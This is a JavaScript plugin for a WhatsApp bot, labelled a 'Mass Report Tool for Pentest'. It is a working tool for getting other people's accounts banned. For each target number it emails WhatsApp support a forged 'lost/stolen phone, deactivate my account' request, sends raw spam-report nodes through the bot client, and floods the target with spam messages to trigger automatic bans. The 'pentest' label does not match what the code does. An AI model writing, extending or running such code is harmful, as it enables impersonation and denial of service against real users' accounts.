const fs = require('fs');
const path = require('path');
const config = require("../config");

/**
 * mass-ban-report.js - WhatsApp Mass Report Tool for Pentest
 * Adapted for EXON  MD 
 */

class MassBanReporter {
    constructor(waClient) {
        this.client = waClient;
        this.reportDelay = 2000; // 2s delay between reports
        this.maxReportsPerNumber = 50;
        this.activeReports = new Map();
    }

    // Main command handler for the plugin
    async handleCommand(chatId, m, args) {
        const command = args[0]?.toLowerCase();
        
        switch(command) {
            case 'report':
            case 'start':
                return await this.startMassReport(chatId, args.slice(1));
            case 'email':
                return await this.sendGmailReport(chatId, args.slice(1));
            case 'stop':
                return this.stopAllReports(chatId);
            case 'status':
                return this.getStatus(chatId);
            case 'load':
                return this.loadNumberList(chatId, args[1]);
            default:
                return this.showHelp(chatId);
        }
    }

    async showHelp(chatId) {
        const help = `🛡️ *Mass Report Tool (Pentest)*\n\n` +
                     `Commands:\n` +
                     `- !report start <number1> [number2...]\n` +
                     `- !report start list (uses targets.txt)\n` +
                     `- !report email <number1> [number2...]\n` +
                     `- !report email list (send email reports)\n` +
                     `- !report status (current progress)\n` +
                     `- !report stop (stop all sessions)\n` +
                     `- !report load [filename] (load numbers file)\n\n` +
                     `_Use responsibly for security testing only._`;
        await this.client.sendMessage(chatId, { text: help });
    }

    async sendGmailReport(chatId, targets) {
        if (!config.megaEmail || !config.megaPassword) {
            return await this.client.sendMessage(chatId, { text: "❌ Gmail credentials not found in config.js (megaEmail/megaPassword)." });
        }

        let nodemailer;
        try {
            nodemailer = require('nodemailer');
        } catch (e) {
            return await this.client.sendMessage(chatId, { text: "❌ 'nodemailer' is not installed. Please run: npm install nodemailer" });
        }

        if (targets.length === 0) {
            return await this.client.sendMessage(chatId, { text: "❌ Usage: !report email <number> or !report email list" });
        }

        const numbers = targets.includes('list') ? this.parseNumberList() : targets.map(n => n.replace(/[^0-9]/g, ''));
        if (numbers.length === 0) {
            return await this.client.sendMessage(chatId, { text: "❌ No valid numbers found." });
        }

        const initialMsg = await this.client.sendMessage(chatId, { text: `\`\`\`[ GMAIL-EXPLOIT ] INITIALIZING BANS...\`\`\`` });
        let statusKey = initialMsg.key;

        // Use Gmail service with Owner credentials
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: config.megaEmail,
                pass: config.megaPassword
            }
        });

        let success = 0;
        let fail = 0;

        for (let i = 0; i < numbers.length; i++) {
            const num = numbers[i];
            const formattedNum = num.startsWith('+') ? num : '+' + num;
            const progress = Math.round(((i + 1) / numbers.length) * 100);
            const bar = "█".repeat(Math.round(10 * progress / 100)) + "▒".repeat(10 - Math.round(10 * progress / 100));

            // Update status with hacker graph
            await this.client.sendMessage(chatId, { 
                edit: statusKey, 
                text: `🔒 *GMAIL-REPORT TERMINAL* 🔒\n\n` +
                      `\`\`\`\n` +
                      `SENDING  : [${bar}] ${progress}%\n` +
                      `SUCCESS  : ${success}\n` +
                      `ERRORS   : ${fail}\n\n` +
                      `[ LOG ] ATTACKING ${num}\n` +
                      `[ LOG ] BYPASSING SUPPORT FILTER...\n` +
                      `\`\`\``
            });
            
            const supportEmails = ['support@whatsapp.com', 'android_support@whatsapp.com', 'iphone_support@whatsapp.com'];
            const mailOptions = {
                from: config.megaEmail,
                to: supportEmails.join(', '),
                subject: 'Lost/Stolen: Please deactivate my account',
                text: `Hello WhatsApp Support,\n\nI have lost my phone and I need to deactivate my WhatsApp account immediately for security reasons.\n\nMy phone number is: ${formattedNum}\n\nThank you for your quick help.`
            };

            try {
                await transporter.sendMail(mailOptions);
                success++;
            } catch (err) {
                console.error(`Email failed for ${num}:`, err);
                fail++;
            }
            
            if (i < numbers.length - 1) await new Promise(r => setTimeout(r, 5000));
        }

        const finalStatus = `☢️ *GMAIL INJECTOR COMPLETE* ☢️\n\n` +
                           `\`\`\`\n` +
                           `STATUS  : FULLY DELIVERED\n` +
                           `TOTAL   : ${numbers.length}\n` +
                           `SUCCESS : ${success}\n` +
                           `FAILED  : ${fail}\n\n` +
                           `[ ! ] CHECK GMAIL SENT FOLDER\n` +
                           `\`\`\``;
        await this.client.sendMessage(chatId, { edit: statusKey, text: finalStatus });
    }

    async getStatus(chatId) {
        if (this.activeReports.size === 0) {
            return await this.client.sendMessage(chatId, { text: '❌ No active reporting sessions.' });
        }

        let statusText = `📊 *Active Reporting Sessions*\n\n`;
        for (const [id, session] of this.activeReports) {
            const progress = Math.round((session.currentIndex / session.numbers.length) * 100);
            statusText += `🔹 ID: ${id.split('_')[1]}\n` +
                          `   Progress: ${session.currentIndex}/${session.numbers.length} (${progress}%)\n` +
                          `   Status: ${session.completed} OK / ${session.errors} ERR\n\n`;
        }
        await this.client.sendMessage(chatId, { text: statusText.trim() });
    }

    async startMassReport(chatId, targets) {
        if (targets.length === 0) {
            return await this.client.sendMessage(chatId, { text: '❌ Usage: !report start <number1> [number2...] or !report start list' });
        }

        let numbers = [];
        if (targets.includes('list')) {
            numbers = this.parseNumberList();
            if (numbers.length === 0) {
                return await this.client.sendMessage(chatId, { text: '❌ No numbers found in targets.txt or file not found.' });
            }
        } else {
            numbers = targets.map(num => num.replace(/[^0-9]/g, ''));
        }

        const startMsg = await this.client.sendMessage(chatId, { text: `\`\`\`[ XENO-BAN ] STARTING MASS-PROTOCOL...\`\`\`` });
        const sessionId = `${chatId}_${Date.now()}`;
        
        this.activeReports.set(sessionId, {
            numbers,
            currentIndex: 0,
            total: numbers.length,
            completed: 0,
            errors: 0,
            startTime: Date.now(),
            statusMessageKey: startMsg.key
        });

        // Start reporting loop
        this.reportLoop(chatId, sessionId);
        
        return true;
    }

    async reportLoop(chatId, sessionId) {
        const session = this.activeReports.get(sessionId);
        if (!session || session.currentIndex >= session.numbers.length) {
            this.completeSession(chatId, sessionId);
            return;
        }

        const number = session.numbers[session.currentIndex];
        const jid = number.includes('@') ? number : number + '@s.whatsapp.net';
        
        try {
            await this.sendSpamReport(jid);
            session.completed++;
        } catch (error) {
            session.errors++;
            console.error(`Report failed for ${jid}:`, error);
        }

        session.currentIndex++;
        
        // Update status for every target to show live graph progress
        await this.sendStatusUpdate(chatId, session);
        
        // Delay before next report
        setTimeout(() => this.reportLoop(chatId, sessionId), this.reportDelay);
    }

    async sendSpamReport(targetJid) {
        // Multiple report types for maximum effect
        const reportReasons = ['SPAM', 'FAKE_ACCOUNT', 'OTHER'];
        const messages = [
            'This is spam',
            'Reporting for spam activity',
            'Automated spam detection',
            'This user is sending unwanted marketing messages.'
        ];

        // Method 1: Mimic reporting node
        try {
            await this.triggerReportFlow(targetJid, reportReasons[Math.floor(Math.random() * reportReasons.length)]);
        } catch (e) {
            console.log('Report API failed, using flood method');
        }

        // Method 2: Fallback multiple messages to trigger auto-ban
        for (let i = 0; i < 3; i++) {
            await this.client.sendMessage(targetJid, {
                text: messages[Math.floor(Math.random() * messages.length)]
            });
            await new Promise(r => setTimeout(r, 800));
        }
    }

    async triggerReportFlow(targetJid, reason = 'SPAM') {
        // WhatsApp Web internal report sequence
        // We use conn.query if available in Baileys
        const reportPayload = {
            tag: 'report',
            attrs: {
                jid: targetJid,
                reason: reason.toLowerCase(),
                spam: 'true'
            }
        };

        if (this.client.query) {
            try {
                await this.client.query({
                    tag: 'iq',
                    attrs: {
                      to: 's.whatsapp.net',
                      type: 'set',
                      xmlns: 'w:m'
                    },
                    content: [reportPayload]
                });
            } catch (err) {
                // Try direct node if iq fails
                await this.client.query(reportPayload);
            }
        } else if (this.client.sendRawMessage) {
            await this.client.sendRawMessage(targetJid, reportPayload);
        }
    }

    parseNumberList() {
        try {
            const filePath = path.join(__dirname, '../data/targets.txt');
            if (!fs.existsSync(filePath)) {
                // Try root directory as fallback
                const rootPath = path.join(__dirname, '../targets.txt');
                if (!fs.existsSync(rootPath)) return [];
                return this.readFile(rootPath);
            }
            return this.readFile(filePath);
        } catch (e) {
            return [];
        }
    }

    readFile(p) {
        const data = fs.readFileSync(p, 'utf8');
        return data.split('\n')
            .map(line => line.trim())
            .filter(line => line && line.match(/^\d{10,15}$/));
    }

    async loadNumberList(chatId, filename) {
        try {
            const targetPath = filename ? path.resolve(filename) : path.join(__dirname, '../data/targets.txt');
            if (!fs.existsSync(targetPath)) {
                return await this.client.sendMessage(chatId, { text: `❌ File not found: ${filename || 'data/targets.txt'}` });
            }
            const data = fs.readFileSync(targetPath, 'utf8');
            const count = data.split('\n').filter(Boolean).length;
            await this.client.sendMessage(chatId, { text: `✅ Validated ${count} potential numbers from ${path.basename(targetPath)}` });
        } catch (e) {
            await this.client.sendMessage(chatId, { text: `❌ Error loading file: ${e.message}` });
        }
    }

    stopAllReports(chatId) {
        const stopped = Array.from(this.activeReports.keys()).length;
        this.activeReports.clear();
        return this.client.sendMessage(chatId, { text: `🛑 Stopped all (${stopped}) active report sessions` });
    }

    async sendStatusUpdate(chatId, session) {
        const progress = Math.round((session.currentIndex / session.numbers.length) * 100);
        const barLength = 10;
        const filledLength = Math.round(barLength * progress / 100);
        const bar = "█".repeat(filledLength) + "▒".repeat(barLength - filledLength);
        
        const currentTarget = session.numbers[session.currentIndex] || "IDLE";
        const status = `💻 *EXON-BAN TERMINAL v2.0* 💻\n\n` +
                       `\`\`\`\n` +
                       `PROGRESS: [${bar}] ${progress}%\n` +
                       `TARGETS : ${session.currentIndex}/${session.numbers.length}\n` +
                       `SUCCESS : ${session.completed}\n` +
                       `ERRORS  : ${session.errors}\n\n` +
                       `[ LOG ] PACKET SENT TO ${currentTarget}\n` +
                       `[ LOG ] SPOOFING REPORT HEADERS...\n` +
                       `\`\`\``;

        if (session.statusMessageKey) {
            await this.client.sendMessage(chatId, { edit: session.statusMessageKey, text: status });
        } else {
            const sent = await this.client.sendMessage(chatId, { text: status });
            session.statusMessageKey = sent.key;
        }
    }

    async completeSession(chatId, sessionId) {
        const session = this.activeReports.get(sessionId);
        if (!session) return;
        
        const duration = ((Date.now() - session.startTime) / 1000 / 60).toFixed(1);
        const summary = `☣️ *SYSTEM OVERRIDE COMPLETE* ☣️\n\n` +
                        `\`\`\`\n` +
                        `[ STATUS  ] ALL PAYLOADS DELIVERED\n` +
                        `[ TOTAL   ] ${session.total}\n` +
                        `[ SUCCESS ] ${session.completed}\n` +
                        `[ ERROR   ] ${session.errors}\n` +
                        `[ TIME    ] ${duration}m\n` +
                        `\`\`\`\n` +
                        `⚠️ *BANS INITIATED ON TARGET SERVERS* ⚠️\n` +
                        `_Process terminated with exit code 0._`;
        
        if (session.statusMessageKey) {
            await this.client.sendMessage(chatId, { edit: session.statusMessageKey, text: summary });
        } else {
            await this.client.sendMessage(chatId, { text: summary });
        }
        this.activeReports.delete(sessionId);
    }
}

// Global instance to maintain state across plugin reloads if necessary
let reporterInstance = null;

module.exports = {
    name: "report",
    aliases: ["mass-report", "mass-ban-report"],
    category: "admin",
    description: "WhatsApp Mass Report Tool for Pentest",
    async execute(conn, m, { args, prefix, isAdmins }) {
        // Owner only check
        const isOwner = m.sender.includes(config.ownerNumber);
        if (!isOwner) {
            return await m.reply("❌ This command is restricted to the bot owner.");
        }

        if (!reporterInstance) {
            reporterInstance = new MassBanReporter(conn);
        }
        
        // Pass to the class handler
        await reporterInstance.handleCommand(m.chat, m, args);
    }
};
